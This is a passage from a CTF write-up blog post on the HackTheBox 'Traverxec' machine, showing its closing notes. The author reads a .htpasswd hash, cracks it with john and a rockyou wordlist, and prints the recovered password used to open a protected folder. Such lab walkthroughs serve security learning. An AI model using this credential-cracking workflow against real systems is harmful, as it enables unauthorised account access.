<h2 id="Additional-notes"><a href="#Additional-notes" class="headerlink" title="Additional notes"></a>Additional notes</h2><p>I will put here a few additional information about this box that could be useful to others.</p>
<h3 id="htpassw-bruteforce"><a href="#htpassw-bruteforce" class="headerlink" title=".htpassw bruteforce"></a>.htpassw bruteforce</h3><p>As you could have noticed in the user flag recon part, a <code>.htpasswd</code> if available, this one is used to restrict access to the <code>protected-file-area</code> folder in <code>david</code> homedir:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/71325453-6e9f3c80-24ed-11ea-8507-3c758091d65c.png" alt="basic auth traverxec"></p>
<p>It was possible to brute-force this <code>.htpasswd</code> file even if it was not needed to solve the box. Here how to do it using the good old <code>john</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ cat /var/nostromo/conf/.htpasswd</span><br><span class="line">david:<span class="variable">$1</span><span class="variable">$e7NfNpNi</span><span class="variable">$A6nCwOTqrNR2oDuIKirRZ</span>/</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"david:<span class="variable">$1</span><span class="variable">$e7NfNpNi</span><span class="variable">$A6nCwOTqrNR2oDuIKirRZ</span>/"</span> &gt; david.hash</span><br><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt david.hash</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (md5crypt, crypt(3) <span class="variable">$1</span>$ (and variants) [MD5 128/128 AVX 4x3])</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">Nowonly4me       (?)</span><br><span class="line">1g 0:00:01:35 DONE (2019-11-17 19:28) 0.01052g/s 111325p/s 111325c/s 111325C/s Noyoo..NovemberRain</span><br><span class="line">Session completed</span><br><span class="line">[hg8@archbook ~]$ john --show david.hash</span><br><span class="line">david:Nowonly4me</span><br></pre></td></tr></table></figure>

<p>Let’s now try to access the <code>protected-file-area</code> using those credentials:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/71325488-f4bb8300-24ed-11ea-9885-e4ef90f7d370.png" alt="david homedir htaccess"></p>
<p>Success!</p>
<hr>
<p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
<p>See you next time ;)</p>
<p>-hg8</p>

  </div>
</article>
<br>
<br>


    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/Easy-Box/">Easy Box</a>
    </div>



    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/CVE-2019-16278/" rel="tag">CVE-2019-16278</a>, <a class="tag-link" href="/tags/Directory-Transversal/" rel="tag">Directory Transversal</a>, <a class="tag-link" href="/tags/GTFOBins/" rel="tag">GTFOBins</a>, <a class="tag-link" href="/tags/john/" rel="tag">john</a>, <a class="tag-link" href="/tags/journalctl/" rel="tag">journalctl</a>, <a class="tag-link" href="/tags/less/" rel="tag">less</a>, <a class="tag-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link" href="/tags/nhttpd/" rel="tag">nhttpd</a>, <a class="tag-link" href="/tags/nostromo/" rel="tag">nostromo</a>, <a class="tag-link" href="/tags/traverxec/" rel="tag">traverxec</a>
    </div>





        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-www-data-gt-david"><span class="toc-number">1.2.</span> <span class="toc-text">Pivot www-data -&gt; david</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Additional-notes"><span class="toc-number">3.</span> <span class="toc-text">Additional notes</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#htpassw-bruteforce"><span class="toc-number">3.1.</span> <span class="toc-text">.htpassw bruteforce</span></a></li></ol></li></ol>
    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021
    <a href="https://hg8.sh">hg8.sh</a>
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


    
<script src="/lib/jquery/jquery.min.js"></script>


<script src="/js/main.js"></script>




</body>
</html>
